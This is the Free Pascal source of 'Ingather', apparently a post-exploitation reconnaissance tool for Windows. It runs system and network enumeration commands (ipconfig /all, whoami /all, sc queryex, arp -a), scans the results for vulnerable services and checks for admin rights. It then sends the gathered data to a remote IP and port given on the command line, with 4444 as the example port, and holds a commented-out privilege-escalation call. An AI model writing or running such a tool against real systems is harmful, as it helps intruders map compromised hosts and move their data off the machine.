program Ingather;

{$mode objfpc}{$H+}

uses
  Classes, SysUtils, CustApp, RunAs, NetSend, FindVulns, RunCMD
  { you can add units after this };

type

  { TIngather }

  TIngather = class(TCustomApplication)
  protected
    procedure DoRun; override;
  public
    constructor Create(TheOwner: TComponent); override;
    destructor Destroy; override;
    procedure WriteHelp; virtual;
  end;

{ TIngather }

procedure TIngather.DoRun;
const
  NUM_CMDS = 5;
  CMD : array[1..NUM_CMDS] of string = ('ipconfig /all','ver','sc queryex' ,'whoami /all','arp -a');
var
  ErrorMsg     : String;
  ip           : AnsiString;
  port         : AnsiString;
  outfile      : AnsiString;
  SendOutput   : TNetSend;
  escalate     : TRunAs;
  vulns        : TFindVulns;
  OutputStream : TStream;
  execute      : TRunCMD;
  x            : Integer;
  output       : AnsiString;
  tfOut        : TextFile;
begin
  output := ''; // initialize the string

  // quick check parameters
  ErrorMsg:=CheckOptions('hipo','help ip port out');
  if ErrorMsg <> '' then begin
    ShowException(Exception.Create(ErrorMsg));
    Terminate;
    Exit;
  end;

  // parse parameters
  if HasOption('h','help') then begin
    WriteHelp;
    Terminate;
    Exit;
  end;

  vulns := TFindVulns.Create;
  execute := TRunCMD.Create;
  for x:= 1 to NUM_CMDS do begin
    OutputStream := execute.Run(CMD[x]);
    output := concat(output, vulns.StreamToString(OutputStream));
  end;
  vulns.getVulnServices(Output);
  execute.Free;
  vulns.Free;

  // Is user an admin
  escalate := TRunAs.Create;
  if escalate.IsUserAdmin then
    writeln('You are an admin!!!')
  else
    writeln('User is not an admin!!!');
  {if escalate.RunAsAdmin(0, 'whoami', '/all') then
    writeln('You are not an admin!!!')
  else
    writeln('Did not run as admin!!!');}
  escalate.Free;

  // Send output to another computer?
  if HasOption('i','ip') and HasOption('p','port') then begin
    ip := Self.GetOptionValue('i','ip');
    port := Self.GetOptionValue('p','port');
    SendOutput := TNetSend.Create;
    SendOutput.SendIt(ip, port, output);
    SendOutput.Free;
  end;

  // Now that all data has been read it can be used; for example to save it to a file on disk
  if HasOption('o','out') then begin
    outfile := Self.GetOptionValue('o','out');
    AssignFile(tfOut, outfile);
    rewrite(tfOut);
    writeln(tfOut, output);
  end;

  // Clean up
  OutputStream.Free;
  Terminate;
end;

constructor TIngather.Create(TheOwner: TComponent);
begin
  inherited Create(TheOwner);
  StopOnException := True;
end;

destructor TIngather.Destroy;
begin
  inherited Destroy;
end;

procedure TIngather.WriteHelp;
begin
  writeln;
  writeln('Usage: Ingather.exe -i 1.1.1.1 -p 4444 -o output.txt');
  writeln('-h --help  : print this help message');
  writeln('-i --ip    : destination IP address');
  writeln('-p --port  : destination port');
  writeln('-o --out   : write to file');
end;

var
  Application: TIngather;
begin
  Application := TIngather.Create(nil);
  Application.Title := 'Ingather';
  Application.Run;
  Application.Free;
end.

